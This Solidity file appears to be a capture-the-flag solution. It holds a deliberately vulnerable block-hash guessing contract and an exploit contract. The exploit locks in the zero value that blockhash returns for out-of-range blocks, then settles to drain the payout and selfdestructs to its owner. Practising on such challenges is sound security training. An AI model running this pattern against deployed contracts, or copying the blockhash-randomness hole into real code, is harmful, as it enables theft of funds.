pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract PredictTheBlockHashChallengeExploit {
  PredictTheBlockHashChallenge target_;
  uint public settlementBlockNumber_;
  bytes32 public answer_;
  address public owner_;
  constructor(address _target) public payable {
    target_ = PredictTheBlockHashChallenge(_target);
    owner_ = msg.sender;
  }

  function lockIn() public payable {
    settlementBlockNumber_ = block.number;
    answer_ = block.blockhash(block.number + 1);
    target_.lockInGuess.value(1 ether)(answer_);
  }

  function hack() public returns(uint){
    bytes32 answer = block.blockhash(settlementBlockNumber_);
    if (answer == answer_) {
      target_.settle();
      return 888;
    }
    return block.number - settlementBlockNumber_;
  }

  function() public payable {
  }

  function destruct() public {
    selfdestruct(owner_);
  }
}
